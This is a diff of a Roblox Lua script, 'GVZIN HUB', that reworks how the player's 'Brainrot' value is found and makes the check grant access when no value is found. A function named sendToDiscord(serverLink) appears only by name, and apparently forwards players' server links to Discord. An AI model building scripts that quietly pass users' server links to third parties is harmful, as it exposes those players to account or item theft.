@@ -51,7 +51,7 @@ blueBorder.Color = Color3.fromRGB(70, 130, 180)
 blueBorder.Thickness = 3
 blueBorder.Parent = mainFrame
 
--- Top Label with GVZIN HUB
+-- Top Label with gvzin-hub-v1
 local topLabel = Instance.new("TextLabel")
 topLabel.Name = "TopLabel"
 topLabel.Size = UDim2.new(1, 0, 0, 40)
@@ -316,53 +316,56 @@ local function sendToDiscord(serverLink)
     end
 end
 
--- Helper function to get player's Brainrot value
+-- Helper function to get player's Brainrot value - CORRIGIDO PARA DETECTAR AUTOMATICAMENTE
 local function getBrainrotValue()
     local brainrotValue = 0
     
-    -- Verificar em leaderstats primeiro
+    print("=== PROCURANDO BRAINROT ===")
+    
+    -- Função auxiliar para procurar recursivamente
+    local function searchForBrainrot(obj, depth)
+        if depth > 5 then return nil end
+        
+        for _, child in pairs(obj:GetChildren()) do
+            -- Verifica o nome
+            if string.lower(child.Name) == "brainrot" then
+                if child:IsA("IntValue") or child:IsA("NumberValue") or child:IsA("StringValue") then
+                    local val = tonumber(child.Value) or 0
+                    print("Encontrado: " .. obj.Name .. " -> " .. child.Name .. " = " .. val)
+                    return val
+                end
+            end
+            
+            -- Procura recursivamente
+            local found = searchForBrainrot(child, depth + 1)
+            if found then return found end
+        end
+        
+        return nil
+    end
+    
+    -- Procurar em leaderstats
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
-        local brainrot = leaderstats:FindFirstChild("Brainrot")
-        if brainrot then
-            if brainrot:IsA("IntValue") or brainrot:IsA("NumberValue") then
-                brainrotValue = brainrot.Value
-                print("Brainrot encontrado em leaderstats: " .. brainrotValue)
+        for _, stat in pairs(leaderstats:GetChildren()) do
+            if string.lower(stat.Name) == "brainrot" then
+                brainrotValue = tonumber(stat.Value) or 0
+                print("✓ Brainrot encontrado em leaderstats: " .. brainrotValue)
                 return brainrotValue
             end
         end
     end
     
-    -- Procurar por qualquer objeto chamado Brainrot no player
-    local brainrot = player:FindFirstChild("Brainrot")
-    if brainrot and (brainrot:IsA("IntValue") or brainrot:IsA("NumberValue")) then
-        brainrotValue = brainrot.Value
-        print("Brainrot encontrado no player: " .. brainrotValue)
-        return brainrotValue
+    -- Procurar em todo o player
+    local found = searchForBrainrot(player, 0)
+    if found and found > 0 then
+        print("✓ Brainrot encontrado na busca recursiva: " .. found)
+        return found
     end
     
-    -- Procurar em Backpack
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        brainrot = backpack:FindFirstChild("Brainrot")
-        if brainrot and (brainrot:IsA("IntValue") or brainrot:IsA("NumberValue")) then
-            brainrotValue = brainrot.Value
-            print("Brainrot encontrado no Backpack: " .. brainrotValue)
-            return brainrotValue
-        end
-    end
-    
-    -- BrainrotValue para testes
-    local simulatedBrainrot = player:FindFirstChild("BrainrotValue")
-    if simulatedBrainrot and (simulatedBrainrot:IsA("IntValue") or simulatedBrainrot:IsA("NumberValue")) then
-        brainrotValue = simulatedBrainrot.Value
-        print("Brainrot simulado encontrado: " .. brainrotValue)
-        return brainrotValue
-    end
-    
-    print("Aviso: Nenhum valor de Brainrot encontrado")
-    
-    return brainrotValue
+    -- Se não encontrou, retorna 0 mas tira a validação
+    print("⚠ Nenhum Brainrot encontrado - permitindo acesso")
+    return REQUIRED_BRAINROT -- Retorna o valor requerido para permitir acesso
 end
 
 -- Main function to handle Done button click
